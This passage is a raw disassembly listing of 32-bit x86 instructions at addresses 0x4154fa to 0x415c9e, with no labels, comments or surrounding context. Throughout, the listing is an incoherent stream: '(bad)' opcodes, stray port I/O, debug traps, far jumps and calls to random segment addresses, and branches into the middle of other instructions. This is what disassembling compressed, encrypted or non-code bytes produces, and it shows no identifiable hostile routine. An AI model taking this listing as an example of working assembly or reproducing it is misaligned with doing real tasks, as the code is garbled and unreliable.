  4154fa:	retf   
  4154fb:	inc    ebx
  4154fc:	pop    edi
  4154fd:	rcl    BYTE PTR [edi-0x4e],1
  415500:	fmul   DWORD PTR [ebx-0x78450a4c]
  415506:	jae    0x4154e9
  415508:	push   ss
  415509:	inc    BYTE PTR [eax+edi*8+0x6]
  41550d:	sbb    BYTE PTR [ebx],cl
  41550f:	jge    0x41552b
  415511:	pop    ds
  415512:	loopne 0x415561
  415514:	and    al,0xde
  415516:	cmp    DWORD PTR ds:0x4c40b2e9,edi
  41551c:	mov    al,ds:0xe16e043
  415521:	stc    
  415522:	sbb    BYTE PTR [edi+0x4f],ch
  415525:	dec    edx
  415526:	jp     0x4155a6
  415528:	mov    ds:0x2391fd27,eax
  41552d:	out    dx,eax
  41552e:	lahf   
  41552f:	jne    0x4154c3
  415531:	sub    eax,0x7caaf48d
  415536:	je     0x415526
  415538:	mov    ds:0xfcbb216b,al
  41553d:	out    0x18,al
  41553f:	ds aam 0x7e
  415542:	ret    0xec04
  415545:	rol    DWORD PTR [edx+ebx*4],1
  415548:	enter  0x4dd4,0x13
  41554c:	jnp    0x4154e5
  41554e:	dec    esp
  41554f:	icebp  
  415550:	push   eax
  415551:	fdivr  st,st(5)
  415553:	and    dl,ah
  415555:	shl    BYTE PTR [ecx-0x39ce5775],cl
  41555b:	das    
  41555c:	stos   DWORD PTR es:[edi],eax
  41555d:	pop    ecx
  41555e:	xor    al,0xde
  415560:	fwait
  415561:	mov    al,ds:0xe1f74603
  415566:	ins    DWORD PTR es:[edi],dx
  415567:	mov    dl,BYTE PTR [ebp+0x7a]
  41556a:	add    BYTE PTR [eax+0x36],ch
  41556d:	out    0x8e,al
  41556f:	adc    DWORD PTR [ebx],ebx
  415571:	sbb    bh,cl
  415573:	sahf   
  415574:	test   DWORD PTR [eax],0x4b114173
  41557a:	adc    al,0xea
  41557c:	xor    bh,cl
  41557e:	sbb    ebx,DWORD PTR [ebx+ecx*4-0x5e]
  415582:	popf   
  415583:	or     dl,dh
  415585:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415586:	xchg   edx,ebx
  415588:	aad    0x25
  41558a:	dec    esi
  41558b:	clc    
  41558c:	test   BYTE PTR [eax],bl
  41558e:	stos   BYTE PTR es:[edi],al
  41558f:	and    edx,DWORD PTR [esi]
  415591:	pop    ebp
  415592:	gs leave 
  415594:	loop   0x415602
  415596:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415597:	arpl   WORD PTR [ebx],dx
  415599:	add    DWORD PTR [ebx+0x44],edx
  41559c:	inc    ebp
  41559d:	out    0xc7,al
  41559f:	xchg   edi,eax
  4155a0:	push   ds
  4155a1:	mov    ds:0x820e1724,eax
  4155a6:	sbb    bl,BYTE PTR [edx]
  4155a8:	test   al,0x35
  4155aa:	xchg   DWORD PTR [edx],eax
  4155ac:	jb     0x4155c5
  4155ae:	mov    al,0x78
  4155b0:	sbb    al,0x9e
  4155b2:	out    0x48,al
  4155b4:	(bad)
  4155b8:	push   0x547f01c9
  4155bd:	pop    ecx
  4155be:	sbb    ecx,DWORD PTR [ecx]
  4155c0:	adc    DWORD PTR [edi],ebp
  4155c2:	outs   dx,DWORD PTR ds:[esi]
  4155c3:	aaa    
  4155c4:	push   ebp
  4155c5:	lds    ecx,FWORD PTR [ebx]
  4155c7:	cmp    al,0x30
  4155c9:	xlat   BYTE PTR ds:[ebx]
  4155ca:	sbb    ah,BYTE PTR [ebp+0x172379e0]
  4155d0:	dec    edi
  4155d1:	mov    ah,0x8
  4155d3:	mov    al,0x6e
  4155d5:	cwde   
  4155d6:	jg     0x41559f
  4155d8:	addr16 cmp eax,0x7efc8cbe
  4155de:	cmp    ah,BYTE PTR [edi-0x75]
  4155e1:	test   BYTE PTR [edi],bl
  4155e3:	xchg   al,bl
  4155e5:	fnstsw WORD PTR [eax-0x41]
  4155e8:	ins    DWORD PTR es:[edi],dx
  4155e9:	ret    
  4155ea:	ret    0x8a4b
  4155ed:	cmc    
  4155ee:	cmc    
  4155ef:	jl     0x415574
  4155f1:	nop
  4155f2:	sbb    al,0x6f
  4155f4:	xor    edi,DWORD PTR [esp+edi*2-0x44]
  4155f8:	test   WORD PTR [edx-0x6b],bp
  4155fc:	imul   ah
  4155fe:	sub    eax,0x44dc2991
  415603:	mov    ebx,0xa0fb990e
  415608:	sti    
  415609:	scas   eax,DWORD PTR es:[edi]
  41560a:	repnz push ebx
  41560c:	aam    0x92
  41560e:	test   eax,0x5f43012e
  415613:	lods   al,BYTE PTR ds:[esi]
  415614:	push   ecx
  415615:	inc    edx
  415616:	test   eax,0xbf540c75
  41561b:	and    bl,BYTE PTR [ebp+0x3a001dbf]
  415621:	add    ah,BYTE PTR [ebx-0x6b]
  415624:	xor    al,bh
  415626:	pop    esi
  415627:	cwde   
  415628:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415629:	mov    edx,0x77859e1d
  41562e:	sbb    al,0x3a
  415630:	aaa    
  415631:	js     0x4155d5
  415633:	add    cl,BYTE PTR [ebp+eax*1+0xadcc84e]
  41563a:	push   cs
  41563b:	ret    
  41563c:	sub    DWORD PTR gs:[ebp-0x44ccf795],0x268caea1
  415647:	add    BYTE PTR [ecx+esi*4],al
  41564a:	into   
  41564b:	adc    dh,BYTE PTR [edi+esi*4+0x44]
  41564f:	sub    eax,0x493b07eb
  415654:	dec    esi
  415655:	scas   al,BYTE PTR es:[edi]
  415656:	dec    edi
  415657:	sbb    al,0x43
  415659:	dec    esi
  41565a:	icebp  
  41565b:	je     0x4155ed
  41565d:	cmp    bl,bh
  41565f:	js     0x4156a9
  415661:	les    eax,FWORD PTR [edi+0x2546a2f4]
  415667:	push   ebp
  415668:	sahf   
  415669:	and    eax,DWORD PTR [eax+0x1637d6a7]
  41566f:	sub    BYTE PTR [edi+0xb805b49],ch
  415675:	retf   
  415676:	cld    
  415677:	xchg   BYTE PTR [ecx+0x7a],bl
  41567a:	cmp    eax,0xdea4f312
  41567f:	adc    ch,BYTE PTR [ebx+edx*2-0x7a444809]
  415686:	aas    
  415687:	mov    cl,0xa9
  415689:	int3   
  41568a:	sub    WORD PTR [ebx],bp
  41568d:	adc    ah,BYTE PTR [eax]
  41568f:	in     eax,dx
  415690:	dec    eax
  415691:	mov    dl,0x92
  415693:	mov    dh,0x65
  415695:	jae    0x110b8d24
  41569b:	mov    esi,0x2f917f34
  4156a0:	xchg   esp,eax
  4156a1:	std    
  4156a2:	sbb    eax,0x15d1a1c9
  4156a7:	adc    ebp,DWORD PTR ds:0xaa318bfe
  4156ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156ae:	cmp    DWORD PTR [edx+0x7a3a6a89],edx
  4156b4:	out    0x90,eax
  4156b6:	scas   eax,DWORD PTR es:[edi]
  4156b7:	pop    esp
  4156b8:	adc    DWORD PTR [ecx+0x31],ecx
  4156bb:	outs   dx,DWORD PTR ds:[esi]
  4156bc:	fdivr  st(0),st
  4156be:	mov    edx,DWORD PTR [ebx+0x3d]
  4156c1:	mov    ah,BYTE PTR [edx-0x4a1cb830]
  4156c7:	(bad)  
  4156c8:	retf   0x38a7
  4156cb:	xchg   edx,eax
  4156cc:	jge    0x415697
  4156ce:	mov    ds:0x4e360ddf,al
  4156d3:	jmp    0xa0899c38
  4156d8:	je     0x41574d
  4156da:	xchg   esi,eax
  4156db:	pop    eax
  4156dc:	test   al,0x92
  4156de:	imul   esp,DWORD PTR ds:0xe1634507,0x7693598c
  4156e8:	cs cs xchg ebx,eax
  4156eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156ec:	rcl    DWORD PTR [edi-0x66],1
  4156ef:	fcomp  QWORD PTR [edx-0x5de2cd30]
  4156f5:	into   
  4156f6:	aas    
  4156f7:	dec    esi
  4156f8:	shr    DWORD PTR [ebx+esi*8-0x11],0xa4
  4156fd:	mov    edi,ecx
  4156ff:	push   ecx
  415700:	out    dx,al
  415701:	push   esp
  415702:	test   al,0xff
  415704:	and    edi,DWORD PTR [edx+0x5f]
  415707:	sub    edx,eax
  415709:	idiv   DWORD PTR [esi+0x7fb1e891]
  41570f:	xchg   esi,eax
  415710:	les    esp,FWORD PTR [esi]
  415712:	rol    DWORD PTR [edi+0x4135af1c],cl
  415718:	push   esp
  415719:	push   eax
  41571a:	push   eax
  41571b:	adc    edi,edx
  41571d:	cmp    dh,cl
  41571f:	xchg   esi,eax
  415720:	in     al,dx
  415721:	in     al,dx
  415722:	push   eax
  415723:	sbb    al,BYTE PTR [ebx+0x1542ee23]
  415729:	dec    ecx
  41572a:	aaa    
  41572b:	cmp    al,0xf7
  41572d:	and    esi,DWORD PTR [esp+ecx*4-0x70]
  415731:	fsubr  DWORD PTR [esi+0x7a]
  415734:	pusha  
  415735:	mov    ebp,0xcc2e9dc9
  41573a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41573b:	and    ebp,DWORD PTR [edi+0x10]
  41573e:	out    0x9e,al
  415740:	xchg   ebx,eax
  415741:	out    0x36,eax
  415743:	push   es
  415744:	retf   0x8222
  415747:	test   BYTE PTR [eax+0x7deff67d],cl
  41574d:	mov    esi,0x90c5e323
  415752:	frstpm(287 only) 
  415754:	sbb    BYTE PTR [ecx+0x4cf5e1b4],cl
  41575a:	mov    BYTE PTR [edi+0x64],cl
  41575d:	cmp    dl,BYTE PTR [edi]
  41575f:	cs pop ss
  415761:	fcomp  QWORD PTR [esi-0x26]
  415764:	cmp    DWORD PTR [ebx+0x6a],edx
  415767:	xchg   ebp,eax
  415768:	pop    esp
  415769:	aaa    
  41576a:	add    BYTE PTR [eax],bl
  41576c:	nop
  41576d:	scas   al,BYTE PTR es:[edi]
  41576e:	xor    BYTE PTR [edi-0x36],ch
  415771:	lods   eax,DWORD PTR ds:[esi]
  415772:	lods   eax,DWORD PTR ds:[esi]
  415773:	mov    ss,WORD PTR [esi]
  415775:	lock clc 
  415777:	mov    ds:0x6eb82d87,al
  41577c:	add    ebx,DWORD PTR ds:0x3edf140e
  415782:	mov    eax,0xe2157520
  415787:	pop    ebp
  415788:	mov    ebp,0xeb09c051
  41578d:	imul   edi,DWORD PTR [ecx+0x69],0xfffffff4
  415791:	aam    0xfc
  415793:	fdivr  st,st(6)
  415795:	sbb    eax,DWORD PTR [ebp-0x62b5a01e]
  41579b:	sub    BYTE PTR [ecx-0x30],bl
  41579e:	pop    ss
  41579f:	nop
  4157a0:	dec    esi
  4157a1:	std    
  4157a2:	fimul  WORD PTR ds:0xf80643a3
  4157a8:	pop    ecx
  4157a9:	push   cs
  4157aa:	mov    eax,ecx
  4157ac:	adc    cl,ah
  4157ae:	sub    ecx,esi
  4157b0:	xchg   ebx,eax
  4157b1:	fisttp QWORD PTR [eax]
  4157b3:	cs jbe 0x41575d
  4157b6:	outs   dx,BYTE PTR ds:[esi]
  4157b7:	repnz dec esp
  4157b9:	out    0x9c,al
  4157bb:	sbb    al,0x67
  4157bd:	pushf  
  4157be:	test   al,0x35
  4157c0:	mov    edi,0xf26321ef
  4157c5:	push   DWORD PTR [edi+ebp*4-0x5779a47b]
  4157cc:	and    ecx,0x3a
  4157cf:	ins    DWORD PTR es:[edi],dx
  4157d0:	inc    edx
  4157d1:	push   0xf9530924
  4157d6:	and    esp,esp
  4157d8:	lock push ss
  4157da:	popa   
  4157db:	imul   edx,DWORD PTR es:[ebx-0x4a18071b],0x608d3ef4
  4157e6:	mov    ds:0x80142220,al
  4157eb:	bound  ecx,QWORD PTR [ebx]
  4157ed:	mov    eax,DWORD PTR [edi-0x1d]
  4157f0:	sub    DWORD PTR [esi-0x60],esp
  4157f3:	jecxz  0x415844
  4157f5:	lahf   
  4157f6:	dec    esp
  4157f7:	sbb    al,0xad
  4157f9:	push   ecx
  4157fa:	push   esp
  4157fb:	lock mov ah,0xb5
  4157fe:	(bad)  
  4157ff:	or     dh,dh
  415801:	sub    eax,0x440828e9
  415806:	leave  
  415807:	cmp    esi,DWORD PTR [esi]
  415809:	sar    BYTE PTR [ebp+0x78f605ec],0xee
  415810:	adc    BYTE PTR [eax+0x1aadc05d],ch
  415816:	rcr    BYTE PTR [eax],cl
  415818:	cli    
  415819:	aas    
  41581a:	pop    edi
  41581b:	jnp    0x415852
  41581d:	in     al,0x1
  41581f:	ss inc esp
  415821:	xor    DWORD PTR [edx+0x7718d0ee],ebx
  415827:	in     eax,0x1
  415829:	gs faddp st(7),st
  41582c:	dec    ebx
  41582d:	inc    ebp
  41582e:	push   ecx
  41582f:	pop    ebx
  415830:	ja     0x4157ff
  415832:	scas   al,BYTE PTR es:[edi]
  415833:	mov    dh,0xf1
  415835:	push   ebp
  415836:	mov    dh,0x54
  415838:	sbb    DWORD PTR [edi+ebp*2-0x2a],esi
  41583c:	pop    eax
  41583d:	ins    DWORD PTR es:[edi],dx
  41583e:	mov    eax,0x8602d5b5
  415843:	les    eax,FWORD PTR [ebp-0xbc4e0]
  415849:	fisub  DWORD PTR ds:0x56dc2448
  41584f:	add    al,0x92
  415851:	mov    cl,0x1a
  415853:	int3   
  415854:	icebp  
  415855:	sbb    BYTE PTR [ebx+eiz*4-0x2596abea],bh
  41585c:	push   ebp
  41585d:	clc    
  41585e:	mov    dl,0xa1
  415860:	inc    ebx
  415861:	push   edx
  415862:	in     al,dx
  415863:	lea    edx,[ebx+eiz*1]
  415866:	mov    BYTE PTR [esi+0x19b1b906],cl
  41586c:	inc    edi
  41586d:	cwde   
  41586e:	and    cl,BYTE PTR [edi]
  415870:	mov    ecx,0x6d98f9b0
  415875:	scas   al,BYTE PTR es:[edi]
  415876:	sahf   
  415877:	dec    esp
  415878:	inc    edx
  415879:	(bad)  
  41587a:	leave  
  41587b:	sahf   
  41587c:	popf   
  41587d:	push   es
  41587e:	das    
  41587f:	data16 jnp 0x41587e
  415882:	push   0xfffffff7
  415884:	push   0xffffffb3
  415886:	push   0x440353a9
  41588b:	int    0x52
  41588d:	jl     0x41587c
  41588f:	pop    es
  415890:	repz mov cl,0xa
  415893:	call   0x231f4b66
  415898:	jae    0x415846
  41589a:	cmp    al,0xd9
  41589c:	or     BYTE PTR [ebx+0x4127716c],0x8f
  4158a3:	mov    ds:0x28dd955b,eax
  4158a8:	adc    BYTE PTR [ebx],dl
  4158aa:	mov    esi,0x38f257c5
  4158af:	idiv   DWORD PTR [esi]
  4158b1:	lods   eax,DWORD PTR ds:[esi]
  4158b2:	xchg   edx,eax
  4158b3:	mov    DWORD PTR [ebp-0x87ac092],ebx
  4158b9:	add    bh,BYTE PTR ds:0x74b4461a
  4158bf:	daa    
  4158c0:	xor    eax,0xc5617ec4
  4158c5:	out    0xf1,al
  4158c7:	cli    
  4158c8:	xchg   ecx,eax
  4158c9:	adc    dl,BYTE PTR [edi]
  4158cb:	stos   BYTE PTR es:[edi],al
  4158cc:	mov    ebp,0x86598248
  4158d1:	and    al,0xe9
  4158d3:	cs mov DWORD PTR cs:[edi+0x7],esi
  4158d8:	dec    esp
  4158d9:	leave  
  4158da:	bound  ebp,QWORD PTR [esi-0x103d5bb]
  4158e0:	sub    cl,BYTE PTR [ebx]
  4158e2:	std    
  4158e3:	outs   dx,DWORD PTR ds:[esi]
  4158e4:	jb     0x415891
  4158e6:	xlat   BYTE PTR ds:[ebx]
  4158e7:	inc    esi
  4158e8:	mov    ch,0x5
  4158ea:	push   esi
  4158eb:	xchg   ecx,eax
  4158ec:	or     DWORD PTR [edi-0x16],ebp
  4158ef:	leave  
  4158f0:	int3   
  4158f1:	jbe    0x41588c
  4158f3:	jmp    0x2854:0x8a51d68b
  4158fa:	fnstcw WORD PTR [edi-0x60]
  4158fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158fe:	xor    bh,bh
  415900:	js     0x415902
  415902:	call   0x497f52f0
  415907:	jge    0x4158c9
  415909:	sub    dl,al
  41590b:	je     0x41595d
  41590d:	mov    cl,0xf5
  41590f:	sbb    ecx,edi
  415911:	jg     0x4158a0
  415913:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415914:	into   
  415915:	sahf   
  415916:	daa    
  415917:	stos   BYTE PTR es:[edi],al
  415918:	into   
  415919:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41591a:	dec    ebp
  41591b:	and    BYTE PTR [eax],bl
  41591d:	add    eax,0x6530919e
  415922:	pop    DWORD PTR [ebx+ebp*2]
  415925:	mov    ecx,0x8ef0ec95
  41592a:	fwait
  41592b:	push   esp
  41592c:	fadd   QWORD PTR [esi+eax*4]
  41592f:	nop
  415930:	ds clc 
  415932:	xor    bl,BYTE PTR [edi-0x64]
  415935:	mov    edi,0xe40655e0
  41593a:	fcmove st,st(2)
  41593c:	xlat   BYTE PTR ds:[ebx]
  41593d:	loopne 0x4158f2
  41593f:	mov    ss,WORD PTR [ebx-0x17]
  415942:	hlt    
  415943:	test   BYTE PTR [esi],0x87
  415946:	and    ecx,DWORD PTR [esp+ebx*8]
  415949:	lods   al,BYTE PTR ds:[esi]
  41594a:	getsec 
  41594c:	inc    esi
  41594d:	xchg   ebx,eax
  41594e:	inc    edi
  41594f:	rcr    BYTE PTR [ebx],0x4
  415952:	imul   edx,DWORD PTR [eax-0x12b027a3],0xffffffda
  415959:	and    eax,DWORD PTR [esi+ecx*1+0x2fe723d2]
  415960:	add    al,BYTE PTR [ebx+0x23]
  415963:	sbb    BYTE PTR [edx+0x64455b69],cl
  415969:	lock jb 0x41593d
  41596c:	cli    
  41596d:	stos   BYTE PTR es:[edi],al
  41596e:	out    dx,al
  41596f:	das    
  415970:	push   edx
  415971:	xchg   edx,eax
  415972:	cmp    al,0xe3
  415974:	jno    0x415981
  415976:	and    edi,edx
  415978:	sub    al,0x3b
  41597a:	xchg   DWORD PTR [edx],esp
  41597c:	mov    bl,0x83
  41597e:	xchg   DWORD PTR [edi-0x2a],eax
  415981:	sbb    dh,BYTE PTR [edx+0x7118d017]
  415987:	(bad)  
  415988:	xor    esi,DWORD PTR [edx-0x6]
  41598b:	cmp    al,0x77
  41598d:	arpl   WORD PTR [ebx-0x26],si
  415990:	pusha  
  415991:	mov    bh,0x8
  415993:	inc    eax
  415994:	jp     0x4159c7
  415996:	(bad)  
  415997:	mov    edi,0x3c4b04ff
  41599c:	mov    dl,0xcb
  41599e:	jnp    0x4159cf
  4159a0:	and    eax,0x3327cf3f
  4159a5:	push   0x5efd4154
  4159aa:	(bad)  
  4159ab:	mov    dh,0xb0
  4159ad:	sti    
  4159ae:	addr16 cmp ecx,ecx
  4159b1:	imul   ecx,DWORD PTR [ebp+0x2],0x59
  4159b5:	rol    BYTE PTR [ebx+0x2140d0d5],0x34
  4159bc:	pop    ebp
  4159bd:	jnp    0x41598f
  4159bf:	out    0x84,al
  4159c1:	push   edx
  4159c2:	lock mov esi,0xf7dc763e
  4159c8:	dec    ebx
  4159c9:	(bad)  
  4159ca:	cmp    esi,edi
  4159cc:	loope  0x415a0d
  4159ce:	xchg   ebp,eax
  4159cf:	or     eax,0xad6009bf
  4159d4:	ins    DWORD PTR es:[edi],dx
  4159d5:	sub    DWORD PTR [ebx],eax
  4159d7:	nop
  4159d8:	jno    0x4159b6
  4159da:	std    
  4159db:	pop    esp
  4159dc:	shl    cl,cl
  4159de:	dec    ax
  4159e0:	sbb    edx,DWORD PTR [ebp-0x11]
  4159e3:	and    edx,DWORD PTR [edi+0x79]
  4159e6:	sbb    al,0x5a
  4159e8:	inc    edx
  4159e9:	dec    ebp
  4159ea:	shl    bh,1
  4159ec:	push   0xc709c054
  4159f1:	dec    ebx
  4159f2:	mov    WORD PTR [edi-0x7b932a98],cs
  4159f8:	or     BYTE PTR [ebx],dl
  4159fa:	pop    ss
  4159fb:	jo     0x415a60
  4159fd:	test   al,0xb5
  4159ff:	cld    
  415a00:	hlt    
  415a01:	inc    ebx
  415a02:	and    ah,ch
  415a04:	ficomp DWORD PTR [esi]
  415a06:	cmp    edx,DWORD PTR [ebp-0x71b88765]
  415a0c:	imul   ecx,edx,0x4e
  415a0f:	fcom   st(6)
  415a11:	outs   dx,DWORD PTR ds:[esi]
  415a12:	pusha  
  415a13:	push   ebx
  415a14:	adc    ah,BYTE PTR [edi+0x71]
  415a17:	mov    esp,0x2f3665bd
  415a1c:	xchg   ebx,eax
  415a1d:	push   edi
  415a1e:	(bad)  
  415a1f:	pop    ss
  415a20:	icebp  
  415a21:	or     al,0x50
  415a23:	sbb    DWORD PTR [ebx],edi
  415a25:	adc    DWORD PTR [edi+0x136175ab],edi
  415a2b:	mov    DWORD PTR ds:0x954bef98,edi
  415a31:	push   ebx
  415a32:	xchg   ebx,eax
  415a33:	sbb    DWORD PTR [ebp+0x36245e2b],eax
  415a39:	or     ah,ah
  415a3b:	dec    ebp
  415a3c:	sub    eax,0x3dcf6d2a
  415a41:	adc    bh,cl
  415a43:	add    BYTE PTR [ebx-0x672728bb],bh
  415a49:	rcl    DWORD PTR [esi-0x3d],cl
  415a4c:	or     dh,bh
  415a4e:	into   
  415a4f:	lods   eax,DWORD PTR ds:[esi]
  415a50:	push   0xbe33fb0a
  415a55:	add    cl,BYTE PTR [ebx+0x2b6fa6ba]
  415a5b:	ret    0xbfac
  415a5e:	fwait
  415a5f:	or     DWORD PTR [eax-0xa],esp
  415a62:	popf   
  415a63:	mov    bl,0x98
  415a65:	or     DWORD PTR [ebp+eax*2+0x7e],0xffffff82
  415a6a:	sub    ah,BYTE PTR [ebx+0x44]
  415a6d:	lods   eax,DWORD PTR ds:[esi]
  415a6e:	ins    DWORD PTR es:[edi],dx
  415a6f:	popf   
  415a70:	adc    esi,edi
  415a72:	loopne 0x415a72
  415a74:	lods   al,BYTE PTR ds:[esi]
  415a75:	jg     0x415a99
  415a77:	pop    es
  415a78:	push   0xa0b3dc74
  415a7d:	psubd  mm1,QWORD PTR [eax+0x1]
  415a81:	jmp    FWORD PTR [esi+0x39]
  415a84:	cmc    
  415a85:	fst    DWORD PTR [ebx]
  415a87:	push   0x16
  415a89:	fild   QWORD PTR [eax]
  415a8b:	js     0x415a9c
  415a8d:	das    
  415a8e:	mov    ds:0x402ba554,eax
  415a93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a94:	push   eax
  415a95:	dec    eax
  415a96:	jg     0x415a84
  415a98:	push   esp
  415a99:	mov    bh,0x7d
  415a9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a9c:	and    esi,edx
  415a9e:	ret    
  415a9f:	adc    cl,BYTE PTR [ebx-0x54]
  415aa2:	daa    
  415aa3:	ins    BYTE PTR es:[edi],dx
  415aa4:	clc    
  415aa5:	jmp    0x5c5f:0x2d3ad00c
  415aac:	push   eax
  415aad:	dec    ebx
  415aae:	mov    ecx,0x51660a72
  415ab3:	in     al,dx
  415ab4:	das    
  415ab5:	or     BYTE PTR [ebx],bl
  415ab7:	ret    
  415ab8:	ror    bh,cl
  415aba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415abb:	sar    DWORD PTR [esi+ebp*4-0x5e76f5b3],0x5c
  415ac3:	(bad)  
  415ac5:	fst    QWORD PTR [eax+0x75]
  415ac8:	mov    ebx,0xdfc42042
  415acd:	retf   0x31eb
  415ad0:	fld    TBYTE PTR [ecx+0x1e]
  415ad3:	adc    eax,0x63e6cad3
  415ad8:	mov    eax,ds:0x82c6cd24
  415add:	imul   esp,DWORD PTR [ecx-0x4ca412d3],0xca00f2d1
  415ae7:	call   0x7935:0x7371752a
  415aee:	jge    0x415ab3
  415af0:	add    bl,ch
  415af2:	iret   
  415af3:	imul   edi,DWORD PTR [edi],0xfffffff4
  415af6:	xchg   ecx,eax
  415af7:	ja     0x415af7
  415af9:	mov    esi,0xb6a8d73a
  415afe:	(bad)
  415b02:	cmp    dh,BYTE PTR [ecx+edi*4-0x44804e04]
  415b09:	adc    eax,0xe1824fed
  415b0e:	sbb    al,0x46
  415b10:	std    
  415b11:	rcl    ecx,1
  415b13:	mov    ah,0xfa
  415b15:	push   0x4a
  415b17:	sub    al,0x97
  415b19:	pop    edi
  415b1a:	sbb    DWORD PTR [edi+ecx*4+0x36],esi
  415b1e:	std    
  415b1f:	mov    ebx,0xe2bc56a6
  415b24:	scas   al,BYTE PTR es:[edi]
  415b25:	jbe    0x415b7f
  415b27:	ret    0x647b
  415b2a:	dec    ebp
  415b2b:	pop    ss
  415b2c:	pop    ebx
  415b2d:	out    0x3e,eax
  415b2f:	shl    BYTE PTR [ebp+ecx*8-0x79],cl
  415b33:	sub    ebp,DWORD PTR [edi]
  415b35:	inc    ecx
  415b36:	sub    BYTE PTR [esi+0x2fdfe72e],bh
  415b3c:	ins    DWORD PTR es:[edi],dx
  415b3d:	cmc    
  415b3e:	popf   
  415b3f:	cli    
  415b40:	xor    eax,0x7a8f4e0c
  415b45:	jns    0x415bb9
  415b47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b48:	mov    esp,0xc53a984f
  415b4d:	add    al,0xdf
  415b4f:	rol    DWORD PTR [ecx],1
  415b51:	mov    al,BYTE PTR [esi]
  415b53:	fwait
  415b54:	adc    al,0x37
  415b56:	loop   0x415b99
  415b58:	out    0x17,al
  415b5a:	or     edi,DWORD PTR [edx+0x79e33d88]
  415b60:	mov    edi,0x9b0db8be
  415b65:	or     eax,0x26992434
  415b6a:	aam    0xb3
  415b6c:	imul   ah
  415b6e:	out    dx,al
  415b6f:	inc    esp
  415b70:	into   
  415b71:	call   0x41a26461
  415b76:	add    ebx,ebx
  415b78:	xchg   BYTE PTR [edx],ch
  415b7a:	sbb    al,0xd7
  415b7c:	add    DWORD PTR ds:0x97d6b044,0xadc2c62e
  415b86:	stos   BYTE PTR es:[edi],al
  415b87:	sub    al,0xb7
  415b89:	mov    ah,0xcc
  415b8b:	pop    eax
  415b8c:	and    DWORD PTR [ebx],esp
  415b8e:	mov    ds:0x6658208f,eax
  415b93:	loopne 0x415b5c
  415b95:	mov    ebx,0xa099265c
  415b9a:	mov    ah,0x32
  415b9c:	adc    al,0xba
  415b9e:	cmp    DWORD PTR [ebx],esp
  415ba0:	jne    0x415bf5
  415ba2:	push   edi
  415ba3:	inc    esp
  415ba4:	push   edx
  415ba5:	push   0x91106ff2
  415baa:	dec    esp
  415bab:	inc    esp
  415bac:	shl    BYTE PTR [edi+eax*4+0x428dba52],1
  415bb3:	outs   dx,BYTE PTR ds:[esi]
  415bb4:	shr    ebp,0xd1
  415bb7:	mov    ch,0x19
  415bb9:	jp     0x415bbe
  415bbb:	cmc    
  415bbc:	mov    edx,0x9b56934
  415bc1:	sub    esi,DWORD PTR [esi-0x3a4b34d3]
  415bc7:	add    al,0xd0
  415bc9:	jecxz  0x415ba3
  415bcb:	leave  
  415bcc:	ss sub dh,dl
  415bcf:	mov    ch,0xe3
  415bd1:	sbb    al,0x26
  415bd3:	call   0xa1cb:0x26ddd01e
  415bda:	in     al,0xea
  415bdc:	sub    eax,0x41ef001a
  415be1:	clc    
  415be2:	sub    esp,ebp
  415be4:	retf   0x56d
  415be7:	into   
  415be8:	int3   
  415be9:	retf   
  415bea:	loop   0x415bea
  415bec:	scas   eax,DWORD PTR es:[edi]
  415bed:	out    dx,al
  415bee:	xchg   esi,eax
  415bef:	in     eax,dx
  415bf0:	inc    esp
  415bf1:	xor    eax,0x8d995d59
  415bf6:	call   0x5ddd217f
  415bfb:	imul   esp,DWORD PTR [ecx],0xffffff98
  415bfe:	jmp    0x5801:0xd5fc5e15
  415c05:	mov    al,ds:0xd4209de1
  415c0a:	outs   dx,BYTE PTR ds:[esi]
  415c0b:	jnp    0x415be4
  415c0d:	std    
  415c0e:	sbb    eax,DWORD PTR [edx]
  415c10:	outs   dx,DWORD PTR ds:[esi]
  415c11:	or     BYTE PTR gs:[edx],dh
  415c14:	fwait
  415c15:	(bad)  
  415c16:	fidiv  DWORD PTR [edi-0x466b6390]
  415c1c:	push   esp
  415c1d:	mov    dl,0x49
  415c1f:	push   ecx
  415c20:	scas   al,BYTE PTR es:[edi]
  415c21:	or     dh,ch
  415c23:	cs gs xchg eax,eax
  415c27:	inc    ecx
  415c28:	xor    eax,edx
  415c2a:	inc    edi
  415c2b:	mov    ebp,edx
  415c2d:	mov    ss,WORD PTR [edx+0x647612ea]
  415c33:	xor    ah,dh
  415c35:	fcomp  st(5)
  415c37:	scas   eax,DWORD PTR es:[edi]
  415c38:	pusha  
  415c39:	sbb    eax,0x9ee68444
  415c3e:	xor    al,0x22
  415c40:	cmp    al,ah
  415c42:	jne    0x415c7d
  415c44:	push   cs
  415c45:	arpl   WORD PTR [eax+0x7e],dx
  415c48:	clc    
  415c49:	out    0x3c,al
  415c4b:	ret    0x9c28
  415c4e:	enter  0x5213,0x3a
  415c52:	sti    
  415c53:	sub    DWORD PTR [ebp-0x3ea8af43],eax
  415c59:	jae    0x415cc7
  415c5b:	rcl    BYTE PTR [ebx],0x28
  415c5e:	ja     0x415c03
  415c60:	fwait
  415c61:	leave  
  415c62:	lock je 0x415bf6
  415c65:	lea    ecx,[edi+0x52]
  415c68:	jmp    0xb5b9:0xbb886a4f
  415c6f:	mov    eax,0xc5f38790
  415c74:	hlt    
  415c75:	add    DWORD PTR [ecx],esi
  415c77:	addr16 mov esi,0xf4e9bcee
  415c7d:	std    
  415c7e:	mov    ds:0x4ee25d2d,al
  415c83:	cmp    eax,0x914d87e
  415c88:	mov    edi,0xfc44414a
  415c8d:	outs   dx,BYTE PTR ds:[esi]
  415c8e:	pop    edx
  415c8f:	dec    esp
  415c90:	inc    esi
  415c91:	imul   esp,DWORD PTR [edi],0x923d5326
  415c97:	mov    eax,0xdabad55b
  415c9c:	xlat   BYTE PTR ds:[ebx]
  415c9d:	push   eax
  415c9e:	sbb    ah,cl
